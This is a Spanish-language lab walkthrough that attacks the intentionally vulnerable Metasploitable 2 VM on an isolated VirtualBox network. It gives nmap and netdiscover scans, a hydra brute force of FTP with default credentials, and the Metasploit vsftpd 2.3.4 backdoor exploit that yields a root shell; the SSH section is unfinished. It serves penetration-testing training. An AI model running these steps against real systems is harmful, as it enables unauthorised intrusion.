![[header_kali.jpg]]
# Atacar Metasploitable 2

---
**Tags:** #info #hacking #tool #kali #pown #virtualbox #arreglar #completar 

> [!info] Volver a [[Home]] | [[Ciberseguridad]] 

>[!abstract] Temario
> * [[#1. Pasos previos]]
> 	* [[#1.1 Configurar Virtualbox]]
> 		* [[#1.1.1 Crear una red NAT ad-hoc]]
> 	* [[#1.2 Configurar Kali Linux]]
> 	* [[#1.3 Conocer mi IP]]
> * [[#2. Escanear la red con netdiscover]]
> * [[#3. Usar nmap]]
> * [[#4. Atacar el servicio ftp usando hydra]]
> * [[#5. Atacar el servicio ftp (port 21)usando searchsploit y metasploit]]
> * [[#6. Atacar el servicio ssh (port22) usando searchsploit y metasploit]]

---
## Descripción

Metasploitable2 es una máquina virtual diseñada específicamente para propósitos de capacitación en ciberseguridad y pruebas de penetración. Su objetivo es proporcionar un entorno controlado y vulnerable en el cual los profesionales de seguridad puedan practicar y aprender sobre cómo identificar y aprovechar vulnerabilidades en sistemas y aplicaciones. Aquí tienes una explicación sencilla de Metasploitable2:

1. **Entorno de Pruebas Seguro**: Metasploitable2 es una máquina virtual que se ejecuta en un software de virtualización, como VirtualBox o VMware. Proporciona un entorno seguro y controlado donde los profesionales de ciberseguridad pueden realizar pruebas sin afectar sistemas en producción.

2. **Vulnerabilidades Intencionales**: Lo que hace que Metasploitable2 sea especial es que está configurado con numerosas vulnerabilidades de seguridad intencionales. Estas vulnerabilidades están allí a propósito para permitir a los usuarios practicar la identificación y explotación de fallos de seguridad.

3. **Sistema Operativo**: Metasploitable2 está basado en una versión antigua de Ubuntu Linux y se ejecuta como una máquina virtual. Contiene servicios y aplicaciones típicamente utilizados en servidores, pero que a menudo tienen configuraciones inseguras.

4. **Uso para Capacitación y Pruebas**: Los profesionales de ciberseguridad pueden utilizar Metasploitable2 para aprender a utilizar herramientas de pruebas de penetración como Metasploit y Nmap, y para comprender cómo funcionan las vulnerabilidades y cómo proteger sistemas contra ataques similares.

5. **Escenario Realista**: Aunque es una máquina virtual, Metasploitable2 se configura para simular un entorno de servidor realista. Los usuarios pueden intentar encontrar y explotar vulnerabilidades de la misma manera en que lo harían en un sistema en producción.

6. **Seguridad Responsable**: Es importante recordar que Metasploitable2 debe utilizarse de manera ética y legal. No se debe utilizar para atacar sistemas que no cuenten con el permiso explícito del propietario. El objetivo es aprender sobre seguridad y cómo defender sistemas, no dañarlos.

En resumen, Metasploitable2 es una herramienta valiosa para aprender sobre ciberseguridad y pruebas de penetración en un entorno controlado y seguro. Permite a los profesionales de seguridad practicar la identificación y explotación de vulnerabilidades de manera responsable.

Descargar para usar con VMWare o VirtualBox: https://sourceforge.net/projects/metasploitable/

---
## 1. Pasos previos

_Se asume que el usuario está usando un sistema que tiene instalado VirtualBox. En una de las máquinas virtuales tiene corriendo Kali Linux y en la otra tiene corriendo Metasploitable 2._
### 1.1 Configurar Virtualbox

Para poder usar la una red NAT, es necesario instalar el paquete VirtualBox-ext-pack. Luego de instalarlo y reiniciar, si usa linux, es posible que tenga que correr el siguiente comando:
```bash
sudo dpkg --configure -a
```

#### 1.1.1 Crear una red NAT ad-hoc

En Virtualbox primero se debe crear una red NAT ad-hoc para que sea utilizada por ambas máquinas virtuales y que se puedan conectar una con otra.

En mi caso la red NAT se llama "InfoSec Network" y responde al rango de IP 10.0.200.0/24. Con la opción de soportar DHCP marcada.

Cuando ambas máquinas estén instanciadas en Virtualbox, se debe ir a la configuración de red de cada una de ellas y se debe asignar la red NAT apropiada (InfoSec Network).

También se pueden seguir las instrucciones que aparecen en este vínculo (instrucciones para windows): https://www.geeksforgeeks.org/how-to-link-kali-linux-with-metasploitable-2/

### 1.2 Configurar Kali Linux

> [!tip] **Revisar la guía [[Kali Linux post-instalacion]]**

Acciones posibles:
- Cambiar el layout del teclado a Español Latinoamericano
- Cambiar contraseña de usuario predeterminado
- Crear otro usuario diferente y darle privilegios de superusuario
- Eliminar el usuario predeterminado

### 1.3 Conocer mi IP

> [!tip] **Revisar la guía [[Conocer la IP del dispositivo]]**

Para conocer la ip propia se puede ejecutar el comando hostname -I
```bash
hostname -I
```

También se puede encontrar más información usando ifconfig eth0
```bash
ifconfig eth0
```

---
## 2. Escanear la red con netdiscover

>[!tip] **Revisar la guía de [[Escanear puertos]]**

> [!info] Más info: https://www.youtube.com/watch?v=81HvYSOj68E&list=PLEAkrOvgdk5RnMOqvQmMeAHl6UFJNiUcs&index=10

En Kali linux se puede encontrar la ip de la víctima usando el comando netdiscover
```bash
sudo netdiscover -r 10.0.200.0/24
```

Con esta herramienta, encontramos varias direcciones, pero la dirección específica de la víctima actual es 10.0.200.5

Para salir de la ejecución del comando se debe presionar en la terminal `CTRL+C`

---
## 3. Usar nmap

> [!tip] **Comando [[Comando nmap]]**

Se puede ejecutar nmap con privilegios de root usando:
```bash
sudo nmap -p- -sV -oN ms2.txt 10.0.200.5
```

```bash
sudo nmap -p- -sV -O 10.0.200.5 >> ms2b.txt
```

Opciones:
- `-p-` Escanea todos los puertos disponibles
- `-sV` Muestra los resultados en pantalla
- `-O` Detecta el sistema operativo de la víctima
- `-oN ms2.txt` Envía la salida al archivo ms2.txt usando flags de nmap
- `>> ms2b.txt` Envía la salida al archivo ms2b.txt usando pipes de bash

La salida es la siguiente:
```bash
# Nmap 7.93 scan initiated Sun Jul 30 14:39:38 2023 as: 
# nmap -p- -sV -oN ms2.txt 10.0.200.5

Nmap scan report for 10.0.200.5
Host is up (0.00032s latency).
Not shown: 65505 closed tcp ports (reset)

PORT STATE SERVICE VERSION
21/tcp open ftp vsftpd 2.3.4
22/tcp open ssh OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp open telnet Linux telnetd
25/tcp open smtp Postfix smtpd
53/tcp open domain ISC BIND 9.4.2
80/tcp open http Apache httpd 2.2.8 ((Ubuntu) DAV/2)
111/tcp open rpcbind 2 (RPC #100000)
139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
512/tcp open exec netkit-rsh rexecd
513/tcp open login
514/tcp open tcpwrapped
1099/tcp open java-rmi GNU Classpath grmiregistry
1524/tcp open bindshell Metasploitable root shell
2049/tcp open nfs 2-4 (RPC #100003)
2121/tcp open ftp ProFTPD 1.3.1
3306/tcp open mysql MySQL 5.0.51a-3ubuntu5
3632/tcp open distccd distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
5432/tcp open postgresql PostgreSQL DB 8.3.0 - 8.3.7
5900/tcp open vnc VNC (protocol 3.3)
6000/tcp open X11 (access denied)
6667/tcp open irc UnrealIRCd
6697/tcp open irc UnrealIRCd
8009/tcp open ajp13 Apache Jserv (Protocol v1.3)
8180/tcp open http Apache Tomcat/Coyote JSP engine 1.1
8787/tcp open drb Ruby DRb RMI (Ruby 1.8; path /usr/lib/ruby/1.8/drb)
33881/tcp open status 1 (RPC #100024)
34382/tcp open nlockmgr 1-4 (RPC #100021)
40268/tcp open java-rmi GNU Classpath grmiregistry
56865/tcp open mountd 1-3 (RPC #100005)

MAC Address: 08:00:27:ED:89:3C (Oracle VirtualBox virtual NIC)
Service Info: Hosts: metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

# Nmap done at Sun Jul 30 14:41:46 2023 -- 1 IP address (1 host up) scanned in 128.14 seconds
```

---
## 4. Atacar el servicio ftp usando hydra

Crear una carpeta de trabajo y entrar ahí.
```bash
mkdir ms2 && cd ms2
```

Para conocer las opciones de hydra, ejecutar:
```bash
hydra -h
```

1. Crear un archivo de usuarios "users.txt" con el siguiente contenido en la carpeta de trabajo
```
msfadmin
service
user
postgres
```

2. Crear un archivo de passwords "passwords.txt" con el siguiente contenido en la carpeta de trabajo
```
msfadmin
service
user
postgres
```

3. Usar Hydra para probar usuarios y passwords usando los archivos creados anteriormente.
```bash
sudo hydra -L users.txt -P passwords.txt 10.0.200.5 ftp
```

La salida es la siguiente:
```bash
┌──(kali㉿kali)-[~/ms2]
└─$ sudo hydra -L users.txt -P passwords.txt 10.0.200.5 ftp
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-07-30 14:52:28
[DATA] max 16 tasks per 1 server, overall 16 tasks, 16 login tries (l:4/p:4), ~1 try per task
[DATA] attacking ftp://10.0.200.5:21/
[21][ftp] host: 10.0.200.5 login: msfadmin password: msfadmin
[21][ftp] host: 10.0.200.5 login: service password: service
[21][ftp] host: 10.0.200.5 login: user password: user
[21][ftp] host: 10.0.200.5 login: postgres password: postgres
1 of 1 target successfully completed, 4 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-07-30 14:52:32
```

4. Conectarse al ftp usando las credenciales encontradas por hydra
```bash
ftp 10.0.200.5
```

La salida es la siguiente:
```bash
┌──(kali㉿kali)-[~/ms2]
└─$ ftp 10.0.200.5
Connected to 10.0.200.5.
220 (vsFTPd 2.3.4)
Name (10.0.200.5:kali): msfadmin
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

5. Ejecutar comandos en FTP

Para listar los directorios y archivos
```bash
ftp> ls
```

La salida es la siguiente:
```bash
ftp> ls
229 Entering Extended Passive Mode (|||16404|).
150 Here comes the directory listing.
drwxr-xr-x 6 1000 1000 4096 Apr 28 2010 vulnerable
226 Directory send OK.
ftp>
```

Para salir de ftp
```bash
ftp> bye
```

---
## 5. Atacar el servicio ftp (port 21)usando searchsploit y metasploit

>[!info] Más información: 
>- https://www.youtube.com/watch?v=ZjDn_A5qJ8c&list=PLEAkrOvgdk5RnMOqvQmMeAHl6UFJNiUcs&index=5&pp=iAQB
>- https://www.youtube.com/watch?v=IYU60eWNbP0&list=PLxTwjzMO9Zf589vKfMm_MPHvx20soRiC8&index=5&pp=iAQB


Sabemos que la versión de ftp de Metasploit2 es `vsftpd 2.3.4`

1. Consultar a searchsploit por el servicio y versión de la víctima.
```bash
searchsploit vsftpd 2.3.4
```

La salida es la siguiente
```bash
┌──(kali㉿kali)-[~/ms2]
└─$ searchsploit vsftpd 2.3.4
-------------------------------------------------------------------- ---------------------------------
Exploit Title | Path
-------------------------------------------------------------------- ---------------------------------
vsftpd 2.3.4 - Backdoor Command Execution | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit) | unix/remote/17491.rb
-------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

La salida nos dice que se encontraron un par de comandos de puerta trasera, uno de ellos de Metasploit.

2. Iniciar metasploit
```bash
msfconsole
```

3. Buscar un exploit

Una vez iniciado, podemos realizar la búsqueda del exploit
```bash
search vsftpd 2.3.4
```

La salida es la siguiente
````bash
┌──(kali㉿kali)-[~/ms2]
└─$ msfconsole
Call trans opt: received. 2-19-98 13:24:18 REC:Loc
Trace program: running
wake up, Neo...
the matrix has you
follow the white rabbit.
  
knock, knock, Neo.
  
(`. ,-,
` `. ,;' /
`. ,'/ .'
`. X /.'
.-;--''--.._` ` (
.' / `
, ` ' Q '
, , `._ \
,.| ' `-.;_'
: . ` ; ` ` --,.._;
' ` , ) .'
`._ , ' /_
; ,''-,;' ``-
``-..__``--`
  
https://metasploit.com
=[ metasploit v6.3.16-dev ]
+ -- --=[ 2315 exploits - 1208 auxiliary - 412 post ]
+ -- --=[ 975 payloads - 46 encoders - 11 nops ]
+ -- --=[ 9 evasion ]
  
Metasploit tip: Writing a custom module? After editing your
module, why not try the reload command
Metasploit Documentation: https://docs.metasploit.com/
  
msf6 > search vsftpd 2.3.4
  
Matching Modules
================
  
# Name Disclosure Date Rank Check Description
- ---- --------------- ---- ----- -----------
0 exploit/unix/ftp/vsftpd_234_backdoor 2011-07-03 excellent No VSFTPD v2.3.4 Backdoor Command Execution
  
Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/vsftpd_234_backdoor
  
msf6 >
````

4. Usar un exploit

En este caso usaremos el primer exploit que aparece, cuyo identificador es cero
```bash
msf6 > use 0
```

En la salida nos indica que lo debemos configurar.
```bash
msf6 > use 0
[*] No payload configured, defaulting to cmd/unix/interact
msf6 exploit(unix/ftp/vsftpd_234_backdoor) >
```

5. Opciones de configuración

Para ver las opciones de configuración se utiliza el comando `show options`
```bash
[*] No payload configured, defaulting to cmd/unix/interact
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options
```

La salida es la siguiente
```bash
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

Name Current Setting Required Description
---- --------------- -------- -----------
CHOST no The local client address
CPORT no The local client port
Proxies no A proxy chain of format type:host:port[,type:host:port][...]
RHOSTS yes The target host(s), see https://docs.metasploit.com/docs/using-metaspl
oit/basics/using-metasploit.html
RPORT 21 yes The target port (TCP)
 
Payload options (cmd/unix/interact):
  
Name Current Setting Required Description
---- --------------- -------- -----------

Exploit target:

Id Name
-- ----
0 Automatic

View the full module info with the info, or info -d command.

msf6 exploit(unix/ftp/vsftpd_234_backdoor) >
```

Esta salida indica que se debe rellenar el RHOSTS objetivo

6. Set RHOSTS
```bash
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set rhosts 10.0.200.5
rhosts => 10.0.200.5
msf6 exploit(unix/ftp/vsftpd_234_backdoor) >
```

Luego, para revisar que haya sido configurado correctamente, se ejecuta nuevamente `show options`
```bash
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options
```

7. Ejecutar el comando `exploit`
```bash
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
```

También se puede ejecutar el comando `run`
```bash
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run
```

La salida es la siguiente
```bash
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
  
[*] 10.0.200.5:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.0.200.5:21 - USER: 331 Please specify the password.
[+] 10.0.200.5:21 - Backdoor service has been spawned, handling...
[+] 10.0.200.5:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (10.0.200.4:40613 -> 10.0.200.5:6200) at 2023-07-30 15:37:23 -0400
```

Una vez que ha encontrado una shell en la máquina víctima, se pueden ejecutar comandos, por ejemplo `ifconfig eth0`, `whoami`, `ls`, etc

---
## 6. Atacar el servicio ssh (port22) usando searchsploit y metasploit

>[!info] Más información: 
> - https://www.youtube.com/watch?v=XalbmfxFie4&list=PLEAkrOvgdk5RnMOqvQmMeAHl6UFJNiUcs&index=6&pp=iAQB
> 


![](https://www.youtube.com/watch?v=r1Z7SxewjhM&list=PLxTwjzMO9Zf589vKfMm_MPHvx20soRiC8&index=12)


Sabemos que la versión de ssh de Metasploit2 es `___`

1. Consultar a searchsploit por el servicio y versión de la víctima.

>[!danger] Falta continuar!!!



---



